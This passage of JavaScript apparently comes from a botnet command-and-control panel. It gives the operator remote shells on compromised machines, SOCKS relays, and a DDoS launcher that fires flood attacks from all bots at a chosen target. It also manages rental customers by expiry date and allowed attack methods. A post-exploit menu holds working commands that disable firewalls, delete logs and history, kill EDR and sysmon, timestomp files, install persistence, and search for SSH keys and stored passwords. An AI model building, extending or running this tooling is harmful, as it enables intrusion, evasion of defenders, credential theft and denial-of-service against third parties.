    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  if (!entries.length) {
    wrap.innerHTML = '<div class="file-empty">Empty directory</div>';
    return;
  }

  // Add parent dir entry
  var html = '<div class="file-entry fe-dir" onclick="shellCd(\'..\')"><span class="file-icon">..</span><span>../</span></div>';
  entries.forEach(function (e) {
    var cls = 'file-entry';
    var icon = '&#128196;'; // file icon
    var click = '';
    if (e.isDir) {
      cls += ' fe-dir'; icon = '&#128193;';
      click = 'onclick="shellCd(\'' + e.name.replace(/'/g, "\\'") + '\')"';
    } else if (e.isLink) {
      cls += ' fe-link'; icon = '&#128279;';
      click = 'onclick="shellSendCmd(\'cat ' + e.name.replace(/'/g, "\\'") + '\')"';
    } else if (e.isExec) {
      cls += ' fe-exec'; icon = '&#9881;';
      click = 'onclick="shellSendCmd(\'file ' + e.name.replace(/'/g, "\\'") + '\')"';
    } else {
      click = 'onclick="shellSendCmd(\'cat ' + e.name.replace(/'/g, "\\'") + '\')"';
    }
    html += '<div class="' + cls + '" ' + click + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span></div>';
  });
  wrap.innerHTML = html;
}

function shellSendCmd(cmd) {
  if (!shellWS || shellWS.readyState !== 1) return;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' ' + cmd + '\n');
  shellWS.send(JSON.stringify({ command: cmd }));
  shellHistory.push(cmd);
  shellHistIdx = shellHistory.length;
}

// ---------------------------------------------------------------------------
// Bot info sidebar
// ---------------------------------------------------------------------------

function renderInfoSidebar(b) {
  var body = document.getElementById('info-sidebar-body');
  if (!b) { body.innerHTML = '<div class="file-empty">No bot info</div>'; return; }
  body.innerHTML =
    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + escHtml(b.botID) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">IP Address</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Architecture</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">CPU Cores</span><span class="isb-val">' + b.cpuCores + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + (b.socksActive ? 'var(--green)' : 'var(--text-dim)') + '">' + (b.socksActive ? 'ON' : 'OFF') + '</span></div>' +
    (b.socksActive && b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '');
}

// ---------------------------------------------------------------------------
// Tab completion
// ---------------------------------------------------------------------------

function showTabComplete(input) {
  var val = input.value;
  if (!val.startsWith('!')) { hideTabComplete(); return; }
  tcMatches = tcCommands.filter(function (c) { return c.cmd.indexOf(val) === 0; });
  if (!tcMatches.length) { hideTabComplete(); return; }
  tcIdx = 0;
  var wrap = document.getElementById('tab-complete');
  wrap.innerHTML = tcMatches.map(function (c, i) {
    return '<div class="tc-item' + (i === 0 ? ' tc-active' : '') + '" data-idx="' + i + '" onclick="selectTabComplete(' + i + ')">' +
      '<span class="tc-cmd">' + escHtml(c.cmd) + '</span><span class="tc-desc">' + escHtml(c.desc) + '</span></div>';
  }).join('');
  wrap.style.display = 'block';
}

function hideTabComplete() {
  document.getElementById('tab-complete').style.display = 'none';
  tcIdx = -1; tcMatches = [];
}

function selectTabComplete(idx) {
  if (idx >= 0 && idx < tcMatches.length) {
    var input = document.getElementById('shell-input');
    input.value = tcMatches[idx].cmd + ' ';
    input.focus();
  }
  hideTabComplete();
}

function navigateTabComplete(dir) {
  if (!tcMatches.length) return;
  tcIdx = (tcIdx + dir + tcMatches.length) % tcMatches.length;
  var items = document.querySelectorAll('#tab-complete .tc-item');
  items.forEach(function (it, i) {
    it.classList.toggle('tc-active', i === tcIdx);
  });
}

// ---------------------------------------------------------------------------
// Shell action buttons
// ---------------------------------------------------------------------------

function copyShellOutput() {
  var text = document.getElementById('shell-output').textContent;
  if (!text) { showToast('Nothing to copy', false); return; }
  navigator.clipboard.writeText(text).then(function () { showToast('Output copied to clipboard', true); })
    .catch(function () { showToast('Copy failed', false); });
}

function saveShellHistory() {
  var content = document.getElementById('shell-output').textContent;
  if (!content) { showToast('Nothing to save', false); return; }
  var blob = new Blob([content], { type: 'text/plain' });
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'shell_' + shellBotID + '_' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.txt';
  a.click(); URL.revokeObjectURL(a.href);
}

function clearShellHistory() {
  document.getElementById('shell-output').innerHTML = '';
  document.getElementById('file-list').innerHTML = '<div class="file-empty">Send a command to populate</div>';
  shellHistory = []; shellHistIdx = 0; shellCwd = '~';
  document.getElementById('shell-prompt').textContent = '~$ ';
  updateBreadcrumb();
  if (shellBotID) delete shellSessions[shellBotID];
}

function shellNetScan() {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var cmd = 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null';
  shellSendCmd(cmd);
}

function shellStartSocks() {
  if (!shellBotID) return;
  popupStartSocks(shellBotID);
}

// ---------------------------------------------------------------------------
// Post-Exploit Shortcuts
// ---------------------------------------------------------------------------

var postExShortcuts = [
  { cat: 'Quick Actions', items: [
    { name: 'Persist All', desc: 'Install cron/startup persistence', cmd: '!persist' },
    { name: 'Reinstall All', desc: 'Force re-download bot binary', cmd: '!reinstall' },
    { name: 'Flush Firewall', desc: 'Drop all iptables rules', cmd: 'iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT' },
    { name: 'Kill Logging', desc: 'Stop syslog and clear logs', cmd: 'service rsyslog stop 2>/dev/null; service syslog-ng stop 2>/dev/null; rm -rf /var/log/*.log /var/log/syslog /var/log/auth.log' },
    { name: 'Clear History', desc: 'Wipe shell history + unset', cmd: 'history -c; rm -f ~/.bash_history ~/.zsh_history; unset HISTFILE HISTSIZE' },
    { name: 'Kill Monitors', desc: 'Stop common EDR/monitoring', cmd: "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig|tcpdump|wireshark' 2>/dev/null" },
    { name: 'Disable Cron', desc: 'Stop cron daemon (anti-cleanup)', cmd: 'service cron stop 2>/dev/null; service crond stop 2>/dev/null' },
    { name: 'Timestomp', desc: 'Set file timestamps to 2023', cmd: 'find /tmp -maxdepth 1 -newer /etc/hostname -exec touch -t 202301010000 {} \\;' },
    { name: 'DNS Flush', desc: 'Clear DNS resolver cache', cmd: 'resolvectl flush-caches 2>/dev/null; systemd-resolve --flush-caches 2>/dev/null; nscd -i hosts 2>/dev/null' },
    { name: 'Kill Sysmon', desc: 'Stop sysmon for linux', cmd: 'service sysmonforlinux stop 2>/dev/null; pkill -9 sysmon 2>/dev/null' }
  ]},
  { cat: 'Recon', items: [
    { name: 'System Info', desc: 'OS, kernel, hostname', cmd: 'uname -a; cat /etc/*release 2>/dev/null | head -5; hostname' },
    { name: 'Network Info', desc: 'Interfaces, routes, DNS', cmd: 'ip -br a; ip route show default; cat /etc/resolv.conf 2>/dev/null | grep nameserver' },
    { name: 'Open Ports', desc: 'Listening ports and PIDs', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
    { name: 'Users w/ Shell', desc: 'Accounts with login shell', cmd: "grep -v -E 'nologin|false|sync|halt|shutdown' /etc/passwd" },
    { name: 'SUID Binaries', desc: 'Find setuid executables', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
    { name: 'Writable Dirs', desc: 'World-writable directories', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | head -20' },
    { name: 'Cron Jobs', desc: 'All scheduled tasks', cmd: 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null' },
    { name: 'Docker/LXC', desc: 'Container environment check', cmd: 'docker ps 2>/dev/null; lxc list 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5' },
    { name: 'SSH Keys', desc: 'Find private keys on disk', cmd: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null" },
    { name: 'Credentials', desc: 'Config files with passwords', cmd: "grep -rl 'password\\|passwd\\|credential' /etc/ /opt/ /var/www/ 2>/dev/null | head -15" },
    { name: 'Sudo Check', desc: 'Sudo permissions for user', cmd: "sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'" },
    { name: 'Proc Tree', desc: 'Running process tree', cmd: 'ps auxf --width 200 2>/dev/null | head -30 || ps aux | head -30' },
    { name: 'Kernel Version', desc: 'Kernel + possible exploits', cmd: 'uname -r; cat /proc/version' },
    { name: 'Mount Points', desc: 'Mounted filesystems', cmd: "mount | grep -v -E 'proc|sys|cgroup|tmpfs'" }
  ]}
];

function toggleShellShortcuts() {
  var existing = document.getElementById('shell-shortcuts-menu');
  if (existing) { existing.remove(); return; }

  var menu = document.createElement('div');
  menu.id = 'shell-shortcuts-menu';
  menu.className = 'shell-shortcuts-menu';

  postExShortcuts.forEach(function (cat) {
    var hdr = document.createElement('div');
    hdr.className = 'ssm-cat';
    hdr.textContent = cat.cat;
    menu.appendChild(hdr);
    cat.items.forEach(function (item) {
      var row = document.createElement('div');
      row.className = 'ssm-item';
      row.innerHTML = '<span class="ssm-name">' + escHtml(item.name) + '</span>' +
        '<span class="ssm-desc">' + escHtml(item.desc) + '</span>';
      row.onclick = function () {
        if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
        var p = document.getElementById('shell-prompt').textContent;
        appendOutput(p + ' ' + item.cmd + '\n');
        shellWS.send(JSON.stringify({ command: item.cmd }));
        menu.remove();
      };
      menu.appendChild(row);
    });
  });

  // Close on outside click
  function closeMenu(e) {
    if (!menu.contains(e.target) && !e.target.closest('.shell-action-btn-shortcuts')) {
      menu.remove();
      document.removeEventListener('click', closeMenu);
    }
  }
  setTimeout(function () { document.addEventListener('click', closeMenu); }, 0);

  document.querySelector('.shell-actions').appendChild(menu);
}

// ---------------------------------------------------------------------------
// Shell input handler
// ---------------------------------------------------------------------------

document.getElementById('shell-input').addEventListener('keydown', function (e) {
  if (e.key === 'Tab') {
    e.preventDefault();
    if (tcMatches.length > 0) {
      selectTabComplete(tcIdx >= 0 ? tcIdx : 0);
    } else {
      showTabComplete(this);
    }
    return;
  }

  if (e.key === 'Enter') {
    hideTabComplete();
    var cmd = this.value.trim();
    if (!cmd || !shellWS) return;
    var p = document.getElementById('shell-prompt').textContent;
    appendOutput(p + ' ' + cmd + '\n');
    shellWS.send(JSON.stringify({ command: cmd }));

    // Track cd for prompt
    if (cmd.match(/^cd(\s|$)/)) {
      var d = cmd.replace(/^cd\s*/, '').trim();
      if (!d || d === '~') { shellCwd = '~'; }
      else if (d.match(/^\//)) { shellCwd = d; }
      else if (d === '..') {
        if (shellCwd === '~' || shellCwd === '/') { }
        else { var parts = shellCwd.split('/'); parts.pop(); shellCwd = parts.join('/') || '/'; }
      } else { shellCwd = (shellCwd === '~' ? '~' : shellCwd) + '/' + d; }
      document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
      updateBreadcrumb();
      setTimeout(function () { refreshFiles(); }, 300);
    }

    shellHistory.push(cmd);
    shellHistIdx = shellHistory.length;
    this.value = '';
  } else if (e.key === 'ArrowUp') {
    if (tcMatches.length) { e.preventDefault(); navigateTabComplete(-1); return; }
    e.preventDefault();
    if (shellHistIdx > 0) { shellHistIdx--; this.value = shellHistory[shellHistIdx]; }
  } else if (e.key === 'ArrowDown') {
    if (tcMatches.length) { e.preventDefault(); navigateTabComplete(1); return; }
    e.preventDefault();
    if (shellHistIdx < shellHistory.length - 1) { shellHistIdx++; this.value = shellHistory[shellHistIdx]; }
    else { shellHistIdx = shellHistory.length; this.value = ''; }
  } else if (e.key === 'Escape') {
    if (tcMatches.length) { hideTabComplete(); return; }
    closeShell();
  } else {
    // Auto-show tab completion for ! prefix
    setTimeout(function () {
      var v = document.getElementById('shell-input').value;
      if (v.startsWith('!') && v.length > 0) showTabComplete(document.getElementById('shell-input'));
      else hideTabComplete();
    }, 0);
  }
});

// ---------------------------------------------------------------------------
// Keyboard shortcuts
// ---------------------------------------------------------------------------

function toggleHelp() {
  var ov = document.getElementById('help-overlay');
  ov.classList.toggle('open');
}

document.addEventListener('keydown', function (e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') return;
  if (e.key === '?') { e.preventDefault(); toggleHelp(); return; }
  if (e.key === 's' || e.key === '/') {
    e.preventDefault();
    var botsTab = document.querySelector('[data-tab="tab-bots"]');
    if (botsTab && !botsTab.classList.contains('active')) switchTab(botsTab);
    document.getElementById('bot-search').focus();
  }
  if (e.key >= '1' && e.key <= '6') {
    var tabs = ['tab-bots', 'tab-socks', 'tab-attack', 'tab-activity', 'tab-tasks', 'tab-users'];
    var tab = document.querySelector('[data-tab="' + tabs[parseInt(e.key) - 1] + '"]');
    if (tab) switchTab(tab);
  }
  if (e.key === 'Escape') {
    var helpOv = document.getElementById('help-overlay');
    if (helpOv && helpOv.classList.contains('open')) { toggleHelp(); return; }
    closeShell(); closeBotPopup();
    var ov = document.getElementById('relay-picker-overlay'); if (ov) ov.remove();
    var nd = document.getElementById('notif-drawer');
    if (nd.classList.contains('open')) toggleNotifs();
  }
});

// ---------------------------------------------------------------------------
// Column Sorting
// ---------------------------------------------------------------------------

var sortField = '', sortAsc = true;

function sortBots(field) {
  if (sortField === field) { sortAsc = !sortAsc; }
  else { sortField = field; sortAsc = true; }

  // Update arrow indicators
  document.querySelectorAll('.sort-arrow').forEach(function (el) { el.textContent = ''; });
  var arrow = document.getElementById('sort-' + field);
  if (arrow) arrow.textContent = sortAsc ? '\u25B2' : '\u25BC';

  // Sort the bots array and re-render
  if (!window._botsArr || !window._botsArr.length) return;
  var bots = window._botsArr.slice();
  bots.sort(function (a, b) {
    var va = a[field], vb = b[field];
    // Handle group field
    if (field === 'group') { va = va || ''; vb = vb || ''; }
    // Numeric fields
    if (typeof va === 'number' && typeof vb === 'number') {
      return sortAsc ? va - vb : vb - va;
    }
    // Boolean fields
    if (typeof va === 'boolean') {
      return sortAsc ? (va === vb ? 0 : va ? -1 : 1) : (va === vb ? 0 : va ? 1 : -1);
    }
    // String fields
    va = String(va || '').toLowerCase();
    vb = String(vb || '').toLowerCase();
    if (va < vb) return sortAsc ? -1 : 1;
    if (va > vb) return sortAsc ? 1 : -1;
    return 0;
  });

  // Re-order DOM rows
  var tbody = document.getElementById('bot-tbody');
  bots.forEach(function (b) {
    var row = document.getElementById('bot-' + sanitizeId(b.botID));
    if (row) tbody.appendChild(row);
  });

  // Update order tracking
  botOrder = bots.map(function (b) { return b.botID; });
  window._botsArr = bots;
  lsSet('sort', { field: sortField, asc: sortAsc });
}

// ---------------------------------------------------------------------------
// Compact Mode
// ---------------------------------------------------------------------------

var compactMode = false;

function refreshAll() {
  fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
  fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
  fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
  showToast('Refreshed', true);
}

function toggleCompactMode() {
  compactMode = !compactMode;
  var wrap = document.getElementById('bot-table-wrap');
  var btn = document.getElementById('compact-toggle');
  if (compactMode) { wrap.classList.add('compact'); btn.classList.add('active'); }
  else { wrap.classList.remove('compact'); btn.classList.remove('active'); }
  lsSet('compact', compactMode);
}

// ---------------------------------------------------------------------------
// Command Bar Toggle
// ---------------------------------------------------------------------------

function toggleCmdBar() {
  var bar = document.getElementById('cmd-bar');
  var btn = bar.querySelector('.cmd-toggle');
  bar.classList.toggle('collapsed');
  btn.classList.toggle('active', !bar.classList.contains('collapsed'));
  lsSet('cmdCollapsed', bar.classList.contains('collapsed'));
}

// ---------------------------------------------------------------------------
// Command Category Filter
// ---------------------------------------------------------------------------
function switchCmdCat(btn) {
  var cats = document.querySelectorAll('.cmd-cat');
  cats.forEach(function (c) { c.classList.remove('active'); });
  btn.classList.add('active');
  var cat = btn.getAttribute('data-cat');
  var sel = document.getElementById('cmd-type');
  var opts = sel.options;
  var firstVisible = null;
  for (var i = 0; i < opts.length; i++) {
    var oc = opts[i].getAttribute('data-cat');
    if (oc === cat) {
      opts[i].style.display = '';
      if (!firstVisible) firstVisible = opts[i];
    } else {
      opts[i].style.display = 'none';
    }
  }
  // select first visible if current selection is hidden
  if (sel.options[sel.selectedIndex].style.display === 'none' && firstVisible) {
    sel.value = firstVisible.value;
  }
  updateArgFields();
}

function clearCmdTarget() {
  var inp = document.getElementById('cmd-bot');
  inp.value = '';
  inp.placeholder = 'all bots';
  document.getElementById('cmd-target-clear').style.display = 'none';
}

function targetBot(botID) {
  var bar = document.getElementById('cmd-bar');
  if (bar.classList.contains('collapsed')) { toggleCmdBar(); }
  var inp = document.getElementById('cmd-bot');
  inp.value = botID;
  document.getElementById('cmd-target-clear').style.display = '';
  inp.classList.add('cmd-target-flash');
  setTimeout(function () { inp.classList.remove('cmd-target-flash'); }, 600);
  showToast('Targeting ' + botID, true);
}

// init category filter on load
document.addEventListener('DOMContentLoaded', function () {
  var first = document.querySelector('.cmd-cat.active');
  if (first) switchCmdCat(first);
});

// ---------------------------------------------------------------------------
// Group Stats Card
// ---------------------------------------------------------------------------

function updateGroupStats() {
  if (!window._botsArr || !window._botsArr.length) {
    document.getElementById('s-groups-card').style.display = 'none';
    return;
  }
  var groups = {};
  window._botsArr.forEach(function (b) {
    if (b.group) groups[b.group] = (groups[b.group] || 0) + 1;
  });
  var card = document.getElementById('s-groups-card');
  var wrap = document.getElementById('s-groups');
  if (!Object.keys(groups).length) { card.style.display = 'none'; return; }
  card.style.display = '';
  wrap.innerHTML = '';
  Object.entries(groups).forEach(function (e) {
    var c = groupColors[groupColorIndex(e[0])];
    var s = document.createElement('span');
    s.className = 'arch-pill';
    s.style.cssText = 'background:' + c.bg + ';color:' + c.fg + ';border-color:' + c.border;
    s.textContent = e[0] + ': ' + e[1];
    wrap.appendChild(s);
  });
}

// ---------------------------------------------------------------------------
// Attack Panel
// ---------------------------------------------------------------------------

var atkMethods = [];

function loadAttackMethods() {
  fetch('/api/attack-methods').then(function (r) { return r.json(); }).then(function (methods) {
    atkMethods = methods;
    var udpGrp = document.getElementById('atk-udp-group');
    var tcpGrp = document.getElementById('atk-tcp-group');
    var l3Grp = document.getElementById('atk-l3-group');
    if (!udpGrp) return;
    udpGrp.innerHTML = ''; tcpGrp.innerHTML = ''; l3Grp.innerHTML = '';
    methods.forEach(function (m) {
      var opt = document.createElement('option');
      opt.value = m.id;
      opt.textContent = m.name;
      if (m.category === 'udp') udpGrp.appendChild(opt);
      else if (m.category === 'tcp') tcpGrp.appendChild(opt);
      else l3Grp.appendChild(opt);
    });
    updateAtkMethodInfo();
  }).catch(function () { });
}

function updateAtkMethodInfo() {
  var sel = document.getElementById('atk-method');
  var desc = document.getElementById('atk-desc');
  var optsDiv = document.getElementById('atk-opts');
  if (!sel || !desc) return;
  var id = sel.value;
  var m = atkMethods.find(function (x) { return x.id === id; });
  desc.textContent = m ? m.category.toUpperCase() + ' | ' + m.desc : '';

  // rebuild advanced options for this method
  if (!optsDiv) return;
  optsDiv.innerHTML = '';
  if (!m || !m.options || m.options.length === 0) {
    optsDiv.innerHTML = '<div style="opacity:0.5;padding:8px">No advanced options for this method</div>';
    return;
  }
  m.options.forEach(function (o) {
    var div = document.createElement('div');
    div.className = 'atk-opt';
    if (o.tooltip) div.setAttribute('title', o.tooltip);
    var lbl = document.createElement('label');
    lbl.textContent = o.label;
    if (o.tooltip) {
      var hint = document.createElement('span');
      hint.className = 'atk-opt-hint';
      hint.textContent = '?';
      hint.setAttribute('title', o.tooltip);
      lbl.appendChild(hint);
    }
    var inp = document.createElement('input');
    inp.type = 'text';
    inp.id = 'atk-opt-' + o.key;
    inp.placeholder = o.default !== undefined && o.default !== '' ? o.default : '\u2014';
    inp.value = o.default || '';
    inp.setAttribute('data-key', o.key);
    inp.setAttribute('data-default', o.default || '');
    inp.setAttribute('autocomplete', 'off');
    div.appendChild(lbl);
    div.appendChild(inp);
    optsDiv.appendChild(div);
  });
}

function toggleAtkAdvanced() {
  var adv = document.getElementById('atk-advanced');
  adv.style.display = adv.style.display === 'none' ? '' : 'none';
}

// ---------------------------------------------------------------------------
// Custom confirm modal (replaces native confirm() dialogs)
// opts: { title, message, details: [{label,val}], icon:'danger'|'warn',
//         confirmText, confirmClass:'danger'|'warn', onConfirm }
// ---------------------------------------------------------------------------
function showConfirm(opts) {
  var old = document.getElementById('confirm-overlay');
  if (old) old.remove();

  var detailsHtml = '';
  if (opts.details && opts.details.length) {
    detailsHtml = '<div class="confirm-details">';
    opts.details.forEach(function (d) {
      detailsHtml += '<span class="cd-label">' + escHtml(d.label) + '</span>';
      detailsHtml += '<span class="cd-val">' + escHtml(d.val) + '</span>';
    });
    detailsHtml += '</div>';
  }

  var iconClass = opts.icon || 'danger';
  var iconChar = iconClass === 'warn' ? '\u26A0' : '\u26A1';
  var btnClass = opts.confirmClass || 'danger';

  var overlay = document.createElement('div');
  overlay.id = 'confirm-overlay';
  overlay.className = 'confirm-overlay';
  overlay.innerHTML =
    '<div class="confirm-box">' +
    '<div class="confirm-header">' +
    '<div class="confirm-icon ' + iconClass + '">' + iconChar + '</div>' +
    '<div class="confirm-title">' + escHtml(opts.title || 'Confirm') + '</div>' +
    '</div>' +
    '<div class="confirm-body">' +
    '<div class="confirm-msg">' + escHtml(opts.message || '') + '</div>' +
    detailsHtml +
    '</div>' +
    '<div class="confirm-footer">' +
    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
    '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
    escHtml(opts.confirmText || 'Confirm') +
    '</button>' +
    '</div>' +
    '</div>';

  document.body.appendChild(overlay);
  requestAnimationFrame(function () { overlay.classList.add('open'); });

  function close() {
    overlay.classList.remove('open');
    setTimeout(function () { overlay.remove(); }, 160);
  }

  document.getElementById('confirm-cancel').onclick = close;
  overlay.addEventListener('click', function (e) { if (e.target === overlay) close(); });
  document.getElementById('confirm-ok').onclick = function () {
    close();
    if (opts.onConfirm) opts.onConfirm();
  };

  // Esc key
  function onKey(e) { if (e.key === 'Escape') { close(); document.removeEventListener('keydown', onKey); } }
  document.addEventListener('keydown', onKey);
}

function fireAttack() {
  var method = document.getElementById('atk-method').value;
  var target = document.getElementById('atk-target').value.trim();
  var port = document.getElementById('atk-port').value.trim() || '80';
  var duration = document.getElementById('atk-duration').value.trim() || '30';
  var botID = document.getElementById('atk-bot').value.trim();

  if (!target) { showToast('Enter a target IP', false); return; }
  if (!method) { showToast('Select a method', false); return; }

  // Build command: !method target port duration [key=val ...]
  var cmd = '!' + method + ' ' + target + ' ' + port + ' ' + duration;

  // Gather advanced options dynamically from rendered fields (skip defaults)
  var optInputs = document.querySelectorAll('#atk-opts input[data-key]');
  optInputs.forEach(function (inp) {
    var val = inp.value.trim();
    var def = inp.getAttribute('data-default') || '';
    if (val && val !== def) cmd += ' ' + inp.getAttribute('data-key') + '=' + val;
  });

  var m = atkMethods.find(function (x) { return x.id === method; });
  var mName = m ? m.name : method;
  var scope = botID ? 'Bot: ' + botID : 'ALL bots';

  showConfirm({
    title: 'Launch Attack',
    message: 'You are about to fire an attack with the following parameters:',
    icon: 'danger',
    details: [
      { label: 'Method', val: mName },
      { label: 'Target', val: target + ':' + port },
      { label: 'Duration', val: duration + 's' },
      { label: 'Scope', val: scope }
    ],
    confirmText: 'Fire',
    confirmClass: 'danger',
    onConfirm: function () {
      fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, botID: botID })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) { showToast(d.message, d.success); })
        .catch(function () { showToast('Attack request failed', false); });
    }
  });
}

function stopAttack() {
  var botID = document.getElementById('atk-bot').value.trim();
  var scope = botID || 'ALL bots';

  showConfirm({
    title: 'Stop Attacks',
    message: 'This will immediately stop all running attacks.',
    icon: 'warn',
    details: [
      { label: 'Scope', val: scope }
    ],
    confirmText: 'Stop All',
    confirmClass: 'warn',
    onConfirm: function () {
      fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: '!stop', botID: botID })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) { showToast(d.message, d.success); })
        .catch(function () { showToast('Stop request failed', false); });
    }
  });
}

// ---------------------------------------------------------------------------
// Users Management
// ---------------------------------------------------------------------------

var usersData = [];

function loadUsers() {
  fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
    usersData = users;
    renderUserCards(users);
  }).catch(function () { showToast('Failed to load users', false); });
}

function renderUserCards(users) {
  var grid = document.getElementById('users-grid');
  if (!users || !users.length) {
    grid.innerHTML = '<div class="no-bots">No users found</div>';
    return;
  }
  grid.innerHTML = users.map(function (u) {
    var expired = new Date(u.expire) < new Date();
    var levelClass = 'ul-' + u.level.toLowerCase();
    var botsStr = u.maxbots > 0 ? u.maxbots : 'all';
    var methods = (u.methods || []).join(', ') || 'none';
    return '<div class="user-card' + (expired ? ' user-expired' : '') + '">' +
      '<div class="uc-header">' +
      '<span class="uc-name">' + escHtml(u.username) + '</span>' +
      '<span class="uc-level ' + levelClass + '">' + escHtml(u.level) + '</span>' +
      '</div>' +
      '<div class="uc-body">' +
      '<div class="uc-field"><span class="uc-label">Password</span><span class="uc-val">' + escHtml(u.password) + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Expires</span><span class="uc-val' + (expired ? ' uc-expired' : '') + '">' + escHtml(u.expire) + (expired ? ' (expired)' : '') + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Max Time</span><span class="uc-val">' + u.maxtime + 's</span></div>' +
      '<div class="uc-field"><span class="uc-label">Concurrents</span><span class="uc-val">' + u.concurrents + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Max Bots</span><span class="uc-val">' + botsStr + '</span></div>' +
      '<div class="uc-field uc-field-full"><span class="uc-label">Methods</span><span class="uc-val uc-methods">' + escHtml(methods) + '</span></div>' +
      '</div>' +
      '<div class="uc-actions">' +
      '<button class="uc-btn uc-edit" onclick="editUser(\'' + escHtml(u.username) + '\')">Edit</button>' +
      '<button class="uc-btn uc-delete" onclick="deleteUser(\'' + escHtml(u.username) + '\')">Delete</button>' +
      '</div>' +
      '</div>';
  }).join('');
}

function showAddUserForm() {
  document.getElementById('user-form-title').textContent = 'Add User';
  document.getElementById('uf-editing').value = '';
  document.getElementById('uf-username').value = '';
  document.getElementById('uf-username').disabled = false;
  document.getElementById('uf-password').value = '';
  document.getElementById('uf-level').value = 'Basic';
  var d = new Date(); d.setMonth(d.getMonth() + 1);
  document.getElementById('uf-expire').value = d.toISOString().split('T')[0];
  document.getElementById('uf-maxtime').value = '300';
  document.getElementById('uf-concurrents').value = '1';
  document.getElementById('uf-maxbots').value = '0';
  document.getElementById('uf-methods').value = 'udpplain,syn,ack';
  document.getElementById('users-form-wrap').style.display = '';
}

function editUser(username) {
  var u = usersData.find(function (x) { return x.username === username; });
  if (!u) return;
  document.getElementById('user-form-title').textContent = 'Edit User';
  document.getElementById('uf-editing').value = username;
  document.getElementById('uf-username').value = u.username;
  document.getElementById('uf-username').disabled = true;
  document.getElementById('uf-password').value = u.password;
  document.getElementById('uf-level').value = u.level;
  document.getElementById('uf-expire').value = u.expire;
  document.getElementById('uf-maxtime').value = u.maxtime;
  document.getElementById('uf-concurrents').value = u.concurrents;
  document.getElementById('uf-maxbots').value = u.maxbots;
  document.getElementById('uf-methods').value = (u.methods || []).join(',');
  document.getElementById('users-form-wrap').style.display = '';
}

function hideUserForm() {
  document.getElementById('users-form-wrap').style.display = 'none';
}

function saveUser() {
  var editing = document.getElementById('uf-editing').value;
  var username = document.getElementById('uf-username').value.trim();
  var password = document.getElementById('uf-password').value.trim();
  var level = document.getElementById('uf-level').value;
  var expire = document.getElementById('uf-expire').value;
  var maxtime = parseInt(document.getElementById('uf-maxtime').value) || 300;
  var concurrents = parseInt(document.getElementById('uf-concurrents').value) || 1;
  var maxbots = parseInt(document.getElementById('uf-maxbots').value) || 0;
  var methodsStr = document.getElementById('uf-methods').value.trim();
  var methods = methodsStr ? methodsStr.split(',').map(function (m) { return m.trim(); }).filter(Boolean) : [];

  if (!username || !password) {
    showToast('Username and password required', false);
    return;
  }

  var payload = {
    username: username,
    password: password,
    level: level,
    expire: expire,
